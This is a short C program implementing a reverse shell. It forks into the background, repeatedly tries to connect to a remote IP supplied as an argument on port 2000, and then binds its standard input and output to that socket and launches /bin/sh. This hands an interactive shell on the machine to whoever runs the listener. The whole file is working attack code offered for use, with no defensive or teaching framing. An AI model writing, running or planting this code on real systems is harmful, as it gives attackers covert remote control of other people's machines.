#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define REMOTE_PORT 2000
#define POLL_DURATION 10

int attempt_connection_to_server(char * remote_address);
void execute_shell(int socket_fd);

int main(int argc, char** argv)
{
    char * remote_address;
	if(argc == 2)
    {
        remote_address = argv[1];
	}
	else
    {
        printf("ERROR NO REMOTE SUPPLIED\n");
        exit(1);
	}
    
	int sock, pid;
    pid = fork();
    if(pid == 0){
         while( (sock = attempt_connection_to_server(remote_address)) == -1)
        {
            printf("Sleeping\n");
            sleep(POLL_DURATION);
        }
        
        execute_shell(sock);
    }   
	return 1;
}

void execute_shell(int socket_fd)
{
    dup2(socket_fd, 0); //stdin
    dup2(socket_fd, 1); //stdout
    dup2(socket_fd, 2); //stderr

    char *argv[1] = {"/bin/sh"};
    execve(argv[0], argv, NULL);
}

int attempt_connection_to_server(char *remote_address){
	
    // Create addr struct
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(REMOTE_PORT);    // Port
    addr.sin_addr.s_addr = inet_addr(remote_address);  // Connection IP

    // Create socket
    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == -1) {
        return -1;
    }

    int connection_failed = 1;

    if (connect(sock, (struct sockaddr *) &addr, sizeof(addr)) == -1)
    {
		close(sock);
		return -1;
    }

	return sock;
}
